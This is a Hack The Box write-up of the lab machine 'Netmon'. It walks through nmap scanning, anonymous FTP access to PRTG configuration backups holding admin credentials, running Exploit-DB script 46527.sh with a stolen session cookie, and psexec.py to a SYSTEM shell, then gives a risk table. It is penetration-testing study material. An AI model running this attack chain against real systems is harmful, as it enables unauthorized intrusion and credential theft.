# Hack the Box - Netmon
> **Machine Name:** Netmon  
> **Platform:** Hack The Box  
> **Difficulty:** Easy  
> **Target IP:** `10.10.10.152`  
> **Operating System:** Windows  
> **Primary Services:** FTP, HTTP, SMB/RPC  
> **Initial Access:** Anonymous FTP → PRTG credentials → authenticated RCE  
> **Privilege Escalation:** Administrator account → PsExec → SYSTEM  
> **Final Result:** Complete system compromise

---
## 1. Enumeration:

### Nmap:

The initial Nmap scan was performed to identify open ports and running services.
```
nmap -T4 -A -p- 10.10.10.152
```

The scan identified several important services:

- **21/tcp — FTP:** Microsoft FTP service with anonymous login enabled.
- **80/tcp — HTTP:** PRTG Network Monitor.
- **135/tcp — MSRPC**
- **139/tcp — NetBIOS-SSN**
- **445/tcp — Microsoft-DS / SMB**
- **5985/tcp — WinRM**
- **47001/tcp — HTTPAPI**
- Several high RPC ports were also exposed.

The most interesting findings were **anonymous FTP access** and the **PRTG Network Monitor web application** running on port 80.

![474](Attachments/Pasted%20image%2020260813220754.png)

![452](Attachments/Pasted%20image%2020260813220758.png)

---
## 2. Web Enumeration:

Visit the Website:
```
http://10.10.10.152/index.htm
```

The website identified the application as:
```
PRTG Network Monitor
```

![605](Attachments/Pasted%20image%2020260813222202.png)

The PRTG version and its configuration storage locations were researched.

The report identified that older PRTG installations store application data under paths similar to:
```
%ALLUSERSPROFILE%\Application data\Paessler\PRTG Network Monitor
```

![605](Attachments/Pasted%20image%2020260813232132.png)
This suggested that PRTG configuration files might contain useful information such as credentials.

---
## 3. Anonymous FTP Access

Nmap showed that anonymous FTP login was allowed.

The FTP service was accessed using:
```
ftp 10.10.10.152
```

The login used:
```
Username: anonymous
```
The server accepted the login successfully.

![461](Attachments/Pasted%20image%2020260813231548.png)

---
## 4. FTP Enumeration:

After logging into FTP, the root directory was listed:
```
ftp> ls
```
after ls there were multiple folders like a c drive.

![412](Attachments/Pasted%20image%2020260813231647.png)

The `Users` directory was then explored.

Using:
```
ls -la
```
revealed the **All Users** directory.
```
cd "All users"
```

and perform `ls -la` again :
![428](Attachments/Pasted%20image%2020260813231911.png)

as researched in the website , the data must be stored in the folder named application data , we might find credentials in that !

access was denied for the command :
```
cd "Application Data"
```
after using this command :
```
cd "Application data\Paessler\PRTG Network Monitor"
```
able to access this folder.

![472](Attachments/Pasted%20image%2020260813232405.png)

---
## 5. PRTG Configuration Files:

Inside the PRTG Network Monitor directory, several important files were discovered:

```
PRTG Configuration.dat
PRTG Configuration.old
PRTG Configuration.old.bak
```
The configuration backup files were downloaded using the FTP `get` command.

![257](Attachments/Pasted%20image%2020260813234111.png)

The backup file:
```
PRTG Configuration.old.bak
```
was inspected for credentials.

The report discovered credentials associated with the PRTG administrator account:
```
User: prtgadmin
Password: PrTg@admin2019
```

![](Attachments/Pasted%20image%2020260813234259.png)

The credentials were then successfully used to log into the PRTG web interface.

![509](Attachments/Pasted%20image%2020260813234544.png)

---
## 6. Exploitation:

(https://www.exploit-db.com/exploits/46527), The report researched a known PRTG vulnerability associated with **authenticated remote code execution**.
![](Attachments/Pasted%20image%2020260813235429.png)
Burp Suite was used to intercept an authenticated request and obtain the session cookie.

The captured request contained the authenticated PRTG cookie, which could then be supplied to the exploit.

The report used the Exploit Database entry associated with the vulnerability and downloaded:
```
46527.sh
```

The script was made executable:
```
chmod +x 46527.sh
```
this allows to write in the file.

Then it was executed against the target using the authenticated session cookie:
```
./46527.sh -u http://10.10.10.152 -c "<cookie from the burpsuit>"
```

![](Attachments/Pasted%20image%2020260813235710.png)

The exploit reported successful completion and created a new user:
```
Username: pentest
Password: P3nT3st!
```

The output also indicated that the new user was added to the administrators group.

---
## 7. SYSTEM Shell Using Impacket:

The report then used **Impacket** to obtain a remote command shell.

![](Attachments/Pasted%20image%2020260814000115.png)

use and run the pip install . as mentioned in the tools guide to run this.

After installing Impacket, `psexec.py` was used with the newly created administrator credentials:
```
psexec.py pentest:'P3nT3st!'@10.10.10.152
```
The tool successfully connected to the target, created a service, and opened a Windows command shell.

The final verification was:
```
whoami
```

The result was:
```
nt authority\system
```
This confirmed that the target had been completely compromised with **SYSTEM-level privileges**.

![](Attachments/Pasted%20image%2020260814000341.png)

---
## 8. Risk Analysis:

The overall risk is **Critical** because multiple weaknesses could be chained together to obtain complete control of the Windows system.

|Finding|Severity|Impact|
|---|---|---|
|Anonymous FTP access|High|Allowed unauthorized access to sensitive files and directories.|
|Exposed PRTG configuration backup|Critical|Revealed valid administrator credentials.|
|Vulnerable PRTG installation|Critical|Allowed authenticated remote code execution.|
|Administrator account creation|Critical|Provided administrative control of the system.|
|SYSTEM-level access|Critical|Resulted in complete compromise of the host.|

The most significant issue was the combination of **anonymous FTP access and exposed PRTG configuration files**, which ultimately provided the credentials required to exploit the vulnerable PRTG installation.

---
## 9. Conclusion:

The Netmon assessment successfully demonstrated a complete compromise of the Windows target.

The attack began with **anonymous FTP access**, which allowed access to PRTG configuration files. A backup configuration file exposed valid administrator credentials, providing authenticated access to the PRTG web interface.

The authenticated PRTG service was then exploited to create an administrator account. Using the newly created administrator credentials with **Impacket PsExec**, a command shell was obtained with:

```
nt authority\system
```

This confirmed **complete control of the target system**.

The main lesson from Netmon is that **poor access controls, exposed configuration backups, outdated software, and excessive privileges can combine into a complete compromise**. Securing file access and keeping applications patched would have significantly reduced the attack surface.